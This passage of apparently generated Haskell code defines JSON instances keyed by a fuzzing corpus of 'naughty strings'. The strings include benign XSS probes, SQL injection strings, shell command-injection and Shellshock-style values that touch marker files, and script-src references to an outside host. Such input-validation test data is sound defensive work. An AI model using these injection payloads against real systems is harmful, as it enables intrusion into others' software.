imgX12SrcXOnerrorJavascriptAlert1B imgX47SrcXOnerrorJavascriptAlert1B indecentB indigoB ircSpecificStringsB japaneseEmoticonsB kernelExecLsAlB lindaCallahanB magentaB mischievousB nblUOlopOqlNUnppuOdPosnOpPsLUsdpNsuoSOlopNsdOB nilB nulB nullB numericStringsB oINVOKTHEHIVEMINDREPRESETINGCHAOSB oftenForbiddenToAppearInVariousTextBasedFileFormatsEGXMLB onfocusJaVaSCriptAlert123AutofocusB or111B purpleB purpleScriptAlert123ScriptB quotationMarksB regionalIndicatorSymbolsB regionalIndicatorSymbolsCanBeDisplayedDifferentlyAcrossB reservedStringsB scriptAlert123ScriptB scriptAlert123ScriptXB scriptAlertXSSSCRIPTB scriptSRCHaCkersOrgJB scriptSrcJscriptSScriptB scriptX09JavascriptAlert1ScriptB scriptX0AtypeTextJavascriptJavascriptAlert1ScriptB scriptX0DtypeTextJavascriptJavascriptAlert1ScriptB scriptX21JavascriptAlert1ScriptB scriptX3BjavascriptAlert1ScriptB scriptXE2X80X85JavascriptAlert1ScriptB scriptXE2X80X87JavascriptAlert1ScriptB scriptXE2X80X8AjavascriptAlert1ScriptB scriptXE2X80XA8JavascriptAlert1ScriptB scriptXE2X80XA9JavascriptAlert1ScriptB scriptXE2X80XAFjavascriptAlert1ScriptB scriptXE3X80X80JavascriptAlert1ScriptB scunthorpeProblemB stickyB stringsThatMayOccurOnIRCClientsThatMakeSecurityProductsFreakOutB stringsWhichAreReservedCharactersInMSDOSWindowsB stringsWhichAttemptToInvokeABenignScriptInjectionShowsVulnerabilityToXSSB stringsWhichContainTextThatShouldBeRenderedRTLIfPossibleEGArabicHebrewB stringsWhichContainTwoByteCharactersCanCauseRenderingIssuesOrCharacterLengthIssuesB stringsWhichContainUnicodeNumbersIfTheCodeIsLocalizedItShouldSeeTheInputAsNumericB stringsWhichMayBeUsedElsewhereInCodeB tentacledB terminalEscapeCodesB the000B the01000B the08B the09B the0XffffffffffffffffB the1B the100B the1000B the100000B the100000000B the1DROPTABLEUsers1B the1IndB the1InfB the21474836481B the22250738585072011E308B theNextLineMayAppearToBeBlankMojibakeOrDingbatsInSomeViewersB theNextLineMayAppearToBeBlankOrMojibakeInSomeViewersB theNextLineMayBeFlaggedForTrailingWhitespaceInSomeViewersB thisFileUnfortunatelyCannotExpressStringsContainingB touchTmpBlnsFailB touchTmpBlnsShellshock2FailB tysonGayB unicodeSymbolsB x00ScriptJavascriptAlert1ScriptB x3CscriptJavascriptAlert1ScriptB) =
        object $ foldMap (maybe [] pure)
        [ Just $ "__ﾛ(,_,*)" .= _B
        , Just $ "ﷺ" .= _2B
        , Just $ "１２３" .= _3B
        , Just $ "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">" .= aHrefHTTPFooBarXYAImgAltImgSrcXXOnerrorJavascriptAlert1AB
        , Just $ "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefJavascriptX00JavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefJavascriptX0DJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX02JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX04JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0AjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0DjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0EjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX0FjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX16JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX19JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1AjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1DjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefX1EjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X81JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80X82JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80XA9JavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>" .= aHrefXE2X80XAFjavascriptJavascriptAlert1IDFuzzelement1TestAB
        , Just $ "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF" .= abcDivStyleXExpressionX5CJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF" .= abcDivStyleXX0AexpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF" .= abcDivStyleXX0DexpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X82ExpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X83ExpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X85ExpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X87ExpressionJavascriptAlert1DEFB
        , Just $ "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF" .= abcDivStyleXXE2X80X8AexpressionJavascriptAlert1DEFB
        , Just $ "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ" .= ambitiousB
        , Just $ "# appear in input." .= appearInInputB
        , Just $ "+++ATH0" .= ath0B
        , Just $ "' autofocus onkeyup='javascript:alert(123)" .= autofocusOnkeyupJavascriptAlert123B
        , Just $ "\t\x000b\&\x000c\& \x0085\&             \x200b\&\x2028\&\x2029\&  　" .= bB
        , Just $ "1'000.00" .= b100000B
        , Just $ "<IMG SRC=# onmouseover=\"alert('xxs')\">" .= bIMGSRCOnmouseoverAlertXxsB
        , Just $ "--><script>alert(123)</script>" .= bScriptAlert123ScriptB
        , Just $ "`touch /tmp/blns.fail`" .= bTouchTmpBlnsFailB
        , Just $ "basement" .= basementB
        , Just $ "\x0001d54b\&\x0001d559\&\x0001d556\& \x0001d562\&\x0001d566\&\x0001d55a\&\x0001d554\&\x0001d55c\& \x0001d553\&\x0001d563\&\x0001d560\&\x0001d568\&\x0001d55f\& \x0001d557\&\x0001d560\&\x0001d569\& \x0001d55b\&\x0001d566\&\x0001d55e\&\x0001d561\&\x0001d564\& \x0001d560\&\x0001d567\&\x0001d556\&\x0001d563\& \x0001d565\&\x0001d559\&\x0001d556\& \x0001d55d\&\x0001d552\&\x0001d56b\&\x0001d56a\& \x0001d555\&\x0001d560\&\x0001d558\&" .= braggadociousB
        , Just $ "But now...\x001b\&[20Cfor my greatest trick...\x001b\&[8m" .= butNow20CforMyGreatestTrick8MB
        , Just $ "# \"Byte order marks\", U+FEFF and U+FFFE, each on its own line." .= byteOrderMarksUFEFFAndUFFFEEachOnItsOwnLineB
        , Just $ "COM1" .= com1B
        , Just $ "COM3" .= com3B
        , Just $ "# Commonly misinterpreted as additional graphic characters." .= commonlyMisinterpretedAsAdditionalGraphicCharactersB
        , Just $ "CON" .= conB
        , Just $ "# contexts.  Divided into three groups based on (US-layout) keyboard position." .= contextsDividedIntoThreeGroupsBasedOnUSLayoutKeyboardPositionB
        , Just $ "#\tCredit: https://twitter.com/jifa/status/625776454479970304" .= creditHTTPSTwitterCOMJifaStatus625776454479970304B
        , Just $ "社會科學院語學研究所" .= cunningB
        , Just $ "/dev/null; touch /tmp/blns.fail ; echo" .= devNullTouchTmpBlnsFailEchoB
        , Just $ "dontMakeAMap" .= dontMakeAMapB
        , Just $ "\x0001\&\x0002\&\x0003\&\x0004\&\x0005\&\x0006\&\x0007\&\x0008\&\x000e\&\x000f\&\x0010\&\x0011\&\x0012\&\x0013\&\x0014\&\x0015\&\x0016\&\x0017\&\x0018\&\x0019\&\x001a\&\x001b\&\x001c\&\x001d\&\x001e\&\x001f\&\x007f\&" .= emptyB
        , Just $ "eval(\"puts 'hello world'\")" .= evalPutsHelloWorldB
        , Just $ "expression" .= expressionB
        , Just $ "FALSE" .= falseB
        , Just $ "File:///" .= fileB
        , Just $ "#\tFile Inclusion" .= fileInclusionB
        , Just $ "#" .= fluffyB
        , Just $ "<foo val=”bar“ />" .= fooValBarB
        , Just $ "사회과학원 어학연구소" .= friskyB
        , Just $ "# general category Cf (in Unicode 8.0.0)." .= generalCategoryCFInUnicode800B
        , Just $ "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" .= hEWHOWATSBEHINDTHEWALB
        , Just $ "--help" .= helpB
        , Just $ "❤️ \x0001f494\& \x0001f48c\& \x0001f495\& \x0001f49e\& \x0001f493\& \x0001f497\& \x0001f496\& \x0001f498\& \x0001f49d\& \x0001f49f\& \x0001f49c\& \x0001f49b\& \x0001f49a\& \x0001f499\&" .= hilariousB
        , Just $ "http://a/%%30%30" .= httpA3030B
        , Just $ "#\tiOS Vulnerabilities" .= iOSVulnerabilitiesB
        , Just $ "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." .= ifYouReReadingThisYouVeBeenInAComaForAlmost20YearsNowWeReTryingANewTechniqueWeDonTKnowWhereThisMessageWillEndUpInYourDreamButWeHopeItWorksPleaseWakeUpWeMissYouB
        , Just $ "<iframe src=http://ha.ckers.org/scriptlet.html <" .= iframeSrcHTTPHaCkersOrgScriptletHTMLB
        , Just $ "<IMG SRC=\" &#14;  javascript:alert('XSS');\">" .= imgSRC14JavascriptAlertXSSB
        , Just $ "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">" .= imgSRCJavX09AscriptAlertXSSB
        , Just $ "<IMG SRC= onmouseover=\"alert('xxs')\">" .= imgSRCOnmouseoverAlertXxsB
        , Just $ "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>" .= imgSRCX6AX61X76X61X73X63X72X69X70X74X3AX61X6CX65X72X74X28X27X58X53X53X27X29B
        , Just $ "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>" .= imgSrc00001060000097000011800000970000115000009900001140000105000011200001160000058000009700001080000101000011400001160000040000003900000880000083000008300000390000041B
        , Just $ "<img src\\x00=x onerror=\"javascript:alert(1)\">" .= imgSrcX00XOnerrorJavascriptAlert1B
        , Just $ "<img src=x onerror=\\x11\"javascript:alert(1)\">" .= imgSrcXOnerrorX11JavascriptAlert1B
        , Just $ "<img src=x onerror=\\x12\"javascript:alert(1)\">" .= imgSrcXOnerrorX12JavascriptAlert1B
        , Just $ "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>" .= imgSrcXxxXX0AonerrorJavascriptAlert1B
        , Just $ "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>" .= imgSrcXxxXX0ConerrorJavascriptAlert1B
        , Just $ "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>" .= imgSrcXxxXX0DonerrorJavascriptAlert1B
        , Just $ "<img \\x00src=x onerror=\"javascript:alert(1)\">" .= imgX00SrcXOnerrorJavascriptAlert1B
        , Just $ "<img \\x11src=x onerror=\"javascript:alert(1)\">" .= imgX11SrcXOnerrorJavascriptAlert1B
        , Just $ "<img \\x12src=x onerror=\"javascript:alert(1)\">" .= imgX12SrcXOnerrorJavascriptAlert1B
        , Just $ "<img \\x47src=x onerror=\"javascript:alert(1)\">" .= imgX47SrcXOnerrorJavascriptAlert1B
        , Just $ "⁰⁴⁵₀₁₂" .= indecentB
        , Just $ "Ω≈ç√∫˜µ≤≥÷" .= indigoB
        , Just $ "#   IRC specific strings" .= ircSpecificStringsB
        , Just $ "#\tJapanese Emoticons" .= japaneseEmoticonsB
        , Just $ "Kernel.exec(\"ls -al /\")" .= kernelExecLsAlB
        , Just $ "Linda Callahan" .= lindaCallahanB
        , Just $ "部落格" .= magentaB
        , Just $ "찦차를 타고 온 펲시맨과 쑛다리 똠방각하" .= mischievousB
        , Just $ "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" .= nblUOlopOqlNUnppuOdPosnOpPsLUsdpNsuoSOlopNsdOB
        , Just $ "NIL" .= nilB
        , Just $ "NUL" .= nulB
        , Just $ "null" .= nullB
        , Just $ "#\tNumeric Strings" .= numericStringsB
        , Just $ "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" .= oINVOKTHEHIVEMINDREPRESETINGCHAOSB
        , Just $ "# Often forbidden to appear in various text-based file formats (e.g. XML)," .= oftenForbiddenToAppearInVariousTextBasedFileFormatsEGXMLB
        , Just $ "\" onfocus=JaVaSCript:alert(123) autofocus" .= onfocusJaVaSCriptAlert123AutofocusB
        , Just $ "' OR 1=1 -- 1" .= or111B
        , Just $ "\"" .= purpleB
        , Just $ "<script>alert(123)</script>" .= purpleScriptAlert123ScriptB
        , Just $ "#\tQuotation Marks" .= quotationMarksB
        , Just $ "#       Regional Indicator Symbols" .= regionalIndicatorSymbolsB
        , Just $ "#       Regional Indicator Symbols can be displayed differently across" .= regionalIndicatorSymbolsCanBeDisplayedDifferentlyAcrossB
        , Just $ "#\tReserved Strings" .= reservedStringsB
        , Just $ "\"><script>alert(123)</script>" .= scriptAlert123ScriptB
        , Just $ "><script>alert(123);</script x=" .= scriptAlert123ScriptXB
        , Just $ "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" .= scriptAlertXSSSCRIPTB
        , Just $ "<SCRIPT SRC=//ha.ckers.org/.j>" .= scriptSRCHaCkersOrgJB
        , Just $ "<script src=\"\\\\%(jscript)s\"></script>" .= scriptSrcJscriptSScriptB
        , Just $ "\"`'><script>\\x09javascript:alert(1)</script>" .= scriptX09JavascriptAlert1ScriptB
        , Just $ "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>" .= scriptX0AtypeTextJavascriptJavascriptAlert1ScriptB
        , Just $ "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>" .= scriptX0DtypeTextJavascriptJavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\x21javascript:alert(1)</script>" .= scriptX21JavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\x3Bjavascript:alert(1)</script>" .= scriptX3BjavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>" .= scriptXE2X80X85JavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>" .= scriptXE2X80X87JavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>" .= scriptXE2X80X8AjavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>" .= scriptXE2X80XA8JavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>" .= scriptXE2X80XA9JavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>" .= scriptXE2X80XAFjavascriptAlert1ScriptB
        , Just $ "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>" .= scriptXE3X80X80JavascriptAlert1ScriptB
        , Just $ "#\tScunthorpe Problem" .= scunthorpeProblemB
        , Just $ "åß∂ƒ©˙∆˚¬…æ" .= stickyB
        , Just $ "#   Strings that may occur on IRC clients that make security products freak out" .= stringsThatMayOccurOnIRCClientsThatMakeSecurityProductsFreakOutB
        , Just $ "#\tStrings which are reserved characters in MSDOS/Windows" .= stringsWhichAreReservedCharactersInMSDOSWindowsB
        , Just $ "#\tStrings which attempt to invoke a benign script injection; shows vulnerability to XSS" .= stringsWhichAttemptToInvokeABenignScriptInjectionShowsVulnerabilityToXSSB
        , Just $ "#\tStrings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew)" .= stringsWhichContainTextThatShouldBeRenderedRTLIfPossibleEGArabicHebrewB
        , Just $ "#\tStrings which contain two-byte characters: can cause rendering issues or character-length issues" .= stringsWhichContainTwoByteCharactersCanCauseRenderingIssuesOrCharacterLengthIssuesB
        , Just $ "#\tStrings which contain unicode numbers; if the code is localized, it should see the input as numeric" .= stringsWhichContainUnicodeNumbersIfTheCodeIsLocalizedItShouldSeeTheInputAsNumericB
        , Just $ "#\tStrings which may be used elsewhere in code" .= stringsWhichMayBeUsedElsewhereInCodeB
        , Just $ "(｡◕ ∀ ◕｡)" .= tentacledB
        , Just $ "#\tTerminal escape codes" .= terminalEscapeCodesB
        , Just $ "0.00" .= the000B
        , Just $ "01000" .= the01000B
        , Just $ "08" .= the08B
        , Just $ "09" .= the09B
        , Just $ "0xffffffffffffffff" .= the0XffffffffffffffffB
        , Just $ "\x0001f60d\&" .= the1B
        , Just $ "$1.00" .= the100B
        , Just $ "1,0/0,0" .= the1000B
        , Just $ "1 000.00" .= the100000B
        , Just $ "1 000 000,00" .= the100000000B
        , Just $ "1'; DROP TABLE users-- 1" .= the1DROPTABLEUsers1B
        , Just $ "1#IND" .= the1IndB
        , Just $ "1#INF" .= the1InfB
        , Just $ "-2147483648/-1" .= the21474836481B
        , Just $ "2.2250738585072011e-308" .= the22250738585072011E308B
        , Just $ "# The next line may appear to be blank, mojibake, or dingbats in some viewers." .= theNextLineMayAppearToBeBlankMojibakeOrDingbatsInSomeViewersB
        , Just $ "# The next line may appear to be blank or mojibake in some viewers." .= theNextLineMayAppearToBeBlankOrMojibakeInSomeViewersB
        , Just $ "# The next line may be flagged for \"trailing whitespace\" in some viewers." .= theNextLineMayBeFlaggedForTrailingWhitespaceInSomeViewersB
        , Just $ "# This file unfortunately cannot express strings containing" .= thisFileUnfortunatelyCannotExpressStringsContainingB
        , Just $ "$(touch /tmp/blns.fail)" .= touchTmpBlnsFailB
        , Just $ "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" .= touchTmpBlnsShellshock2FailB
        , Just $ "Tyson Gay" .= tysonGayB
        , Just $ "#\tUnicode Symbols" .= unicodeSymbolsB
        , Just $ "'`\"><\\x00script>javascript:alert(1)</script>" .= x00ScriptJavascriptAlert1ScriptB
        , Just $ "'`\"><\\x3Cscript>javascript:alert(1)</script>" .= x3CscriptJavascriptAlert1ScriptB
        ]

instance FromJSON B where
    parseJSON (Object v) = B
        <$> v .: "__ﾛ(,_,*)"
        <*> v .: "ﷺ"
        <*> v .: "１２３"
        <*> v .: "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">"
        <*> v .: "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>"
        <*> v .: "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF"
        <*> v .: "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF"
        <*> v .: "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ"
        <*> v .: "# appear in input."
        <*> v .: "+++ATH0"
        <*> v .: "' autofocus onkeyup='javascript:alert(123)"
        <*> v .: "\t\x000b\&\x000c\& \x0085\&             \x200b\&\x2028\&\x2029\&  　"
        <*> v .: "1'000.00"
        <*> v .: "<IMG SRC=# onmouseover=\"alert('xxs')\">"
        <*> v .: "--><script>alert(123)</script>"
        <*> v .: "`touch /tmp/blns.fail`"
        <*> v .: "basement"
        <*> v .: "\x0001d54b\&\x0001d559\&\x0001d556\& \x0001d562\&\x0001d566\&\x0001d55a\&\x0001d554\&\x0001d55c\& \x0001d553\&\x0001d563\&\x0001d560\&\x0001d568\&\x0001d55f\& \x0001d557\&\x0001d560\&\x0001d569\& \x0001d55b\&\x0001d566\&\x0001d55e\&\x0001d561\&\x0001d564\& \x0001d560\&\x0001d567\&\x0001d556\&\x0001d563\& \x0001d565\&\x0001d559\&\x0001d556\& \x0001d55d\&\x0001d552\&\x0001d56b\&\x0001d56a\& \x0001d555\&\x0001d560\&\x0001d558\&"
        <*> v .: "But now...\x001b\&[20Cfor my greatest trick...\x001b\&[8m"
        <*> v .: "# \"Byte order marks\", U+FEFF and U+FFFE, each on its own line."
        <*> v .: "COM1"
        <*> v .: "COM3"
        <*> v .: "# Commonly misinterpreted as additional graphic characters."
        <*> v .: "CON"
        <*> v .: "# contexts.  Divided into three groups based on (US-layout) keyboard position."
        <*> v .: "#\tCredit: https://twitter.com/jifa/status/625776454479970304"
        <*> v .: "社會科學院語學研究所"
        <*> v .: "/dev/null; touch /tmp/blns.fail ; echo"
        <*> v .: "dontMakeAMap"
        <*> v .: "\x0001\&\x0002\&\x0003\&\x0004\&\x0005\&\x0006\&\x0007\&\x0008\&\x000e\&\x000f\&\x0010\&\x0011\&\x0012\&\x0013\&\x0014\&\x0015\&\x0016\&\x0017\&\x0018\&\x0019\&\x001a\&\x001b\&\x001c\&\x001d\&\x001e\&\x001f\&\x007f\&"
        <*> v .: "eval(\"puts 'hello world'\")"
        <*> v .: "expression"
        <*> v .: "FALSE"
        <*> v .: "File:///"
        <*> v .: "#\tFile Inclusion"
        <*> v .: "#"
        <*> v .: "<foo val=”bar“ />"
        <*> v .: "사회과학원 어학연구소"
        <*> v .: "# general category Cf (in Unicode 8.0.0)."
        <*> v .: "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕"
        <*> v .: "--help"
        <*> v .: "❤️ \x0001f494\& \x0001f48c\& \x0001f495\& \x0001f49e\& \x0001f493\& \x0001f497\& \x0001f496\& \x0001f498\& \x0001f49d\& \x0001f49f\& \x0001f49c\& \x0001f49b\& \x0001f49a\& \x0001f499\&"
        <*> v .: "http://a/%%30%30"
        <*> v .: "#\tiOS Vulnerabilities"
        <*> v .: "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you."
        <*> v .: "<iframe src=http://ha.ckers.org/scriptlet.html <"
        <*> v .: "<IMG SRC=\" &#14;  javascript:alert('XSS');\">"
        <*> v .: "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">"
        <*> v .: "<IMG SRC= onmouseover=\"alert('xxs')\">"
        <*> v .: "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>"
        <*> v .: "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>"
        <*> v .: "<img src\\x00=x onerror=\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=\\x11\"javascript:alert(1)\">"
        <*> v .: "<img src=x onerror=\\x12\"javascript:alert(1)\">"
        <*> v .: "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>"
        <*> v .: "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>"
        <*> v .: "<img \\x00src=x onerror=\"javascript:alert(1)\">"
